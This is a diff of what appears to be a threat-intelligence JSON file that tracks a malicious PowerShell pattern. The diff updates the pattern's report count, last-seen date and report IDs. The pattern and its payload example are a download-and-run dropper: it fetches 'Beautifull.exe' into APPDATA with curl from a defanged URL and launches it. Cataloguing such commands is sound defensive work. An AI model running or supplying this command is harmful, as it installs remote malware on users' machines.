@@ -437,13 +437,14 @@
   {
     "Pattern": "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"<URL>\"; if (Test-Path $p) { Start-Process $p }; exit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 3,
+    "ReportCount": 4,
     "FirstSeen": "2026-11-21T18:08:11.796000+00:00",
-    "LastSeen": "2026-11-24T18:14:07.462000+00:00",
+    "LastSeen": "2026-11-27T08:31:16.530000+00:00",
     "ReportIds": [
       "cmwqq17ls27rw0oml42clk3bv",
       "cmwv06sn108z90nmllnm9vbl9",
-      "cmwv0ke1j09ge0nml7qoagfb9"
+      "cmwv0ke1j09ge0nml7qoagfb9",
+      "cmwyq2eaq0i5q0omljvzkejxo"
     ],
     "PayloadExamples": [
       "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"https://swingerwives[.]com\"; if (Test-Path $p) { Start-Process $p }; exit",
